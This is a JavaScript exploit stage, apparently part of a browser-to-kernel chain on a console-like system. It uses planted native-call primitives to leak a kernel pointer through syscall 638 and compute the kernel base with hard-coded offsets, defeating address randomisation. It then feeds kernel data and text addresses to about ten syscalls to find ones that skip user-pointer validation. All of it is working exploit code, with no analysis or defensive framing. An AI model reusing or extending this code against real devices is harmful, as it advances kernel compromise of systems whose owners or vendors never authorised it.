// Multi-syscall pointer triad sweep: the 601 mdbg_service signature
// hunt. 601 proved a kernel-pointer/kern-text pointer passes its
// accessibility probe while unmapped-user faults — missing userspace
// validation. This sweep runs the SAME triad {mapped-user,
// unmapped-user, KERNEL_DATA, KERNEL_TEXT} across the remaining
// pointer-handling syscalls (600 sandbox_path, 603 rdup, 604
// dl_get_metadata, 611 paging_stats, 612 proc_type_info, 613
// resident_count, 614 prepare_to_suspend (absent from wrapper window),
// 615 resident_fmem_count, 629, 637), with 601 as a per-boot control
// (expected ENOSYS/ENOSYS/ENOSYS with EFAULT only on unmapped).
// kbase derived at runtime via 638 sel=0 through call64. A syscall
// whose KERNEL result differs from its UNMAPPED result while matching
// MAPPED is a 601-shaped missing-validation hit. arg2 = 0x1000.
// Full restore, PID verified, markers 7 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys601 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("triad_preflight");
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var c638 = native.call("sys638", [0, out2Addr, out3Addr]);
  var e638 = (c638.value === -1) ? native.readErrno() : null;
  if (c638.value !== 0)
    throw new Error("call638_failed_" + e638);
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var OFF = 0x3B1AABA0;
  var blo = (klo - OFF) >>> 0;
  var bhi = khi;
  if (klo < OFF) { blo = (klo - OFF) >>> 0; bhi = (khi - 1) >>> 0; }
  var DOFF = 0x3AC30DF0;
  var dlo = (blo + DOFF) >>> 0;
  var dhi = (bhi + ((blo + DOFF) > 0xffffffff ? 1 : 0)) >>> 0;
  var kdArg = [dlo, dhi];
  var ktArg = [blo, bhi];
  var muArg = [native.frameAddress % 0x100000000,
    Math.floor(native.frameAddress / 0x100000000)];
  var uuArg = [0, 0x7000];
  var lenArg = [0x1000, 0];
  mark("triad_kbase_ok");
  var names = ["sys601", "sys600", "sys603", "sys604",
    "sys611", "sys612", "sys613", "sys614", "sys615",
    "sys629", "sys637"];
  var domains = [
    { tag: "mu", arg: muArg },
    { tag: "uu", arg: uuArg },
    { tag: "kd", arg: kdArg },
    { tag: "kt", arg: ktArg }
  ];
  var lines = [];
  for (var i = 0; i < names.length; i++) {
    var name = names[i];
    phase = name;
    if (!native.wrappers[name]) {
      lines.push(name.slice(3) + ":absent");
      continue;
    }
    var line = name.slice(3) + ":";
    for (var d = 0; d < domains.length; d++) {
      var c = native.call64(name, [domains[d].arg, lenArg]);
      var e = (c.value === -1) ? native.readErrno() : null;
      line += domains[d].tag + "(" + c.value + "/" +
        (e === null ? "ok" : e) + ")";
    }
    lines.push(line);
    if (i === 0) mark("triad_control_ok");
    if (i === 5) mark("triad_half");
  }
  mark("triad_kdkt_done");
  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  mark("triad_done");
  var linesA = [], linesB = [];
  for (var li = 0; li < lines.length; li++) {
    if (linesA.join(" | ").length + lines[li].length < 440)
      linesA.push(lines[li]);
    else linesB.push(lines[li]);
  }
  result = { id: "kptr_triad_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { kbase: bhi.toString(16) + pad8(blo),
      lines_a: linesA.join(" | "),
      lines_b: linesB.join(" | "),
      pid_ok: after.value === before.value && after.high === 0 } };
  function pad8(lo) {
    var h = lo.toString(16);
    while (h.length < 8) h = "0" + h;
    return h;
  }
} catch (error) {
  result = { id: "kptr_triad_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
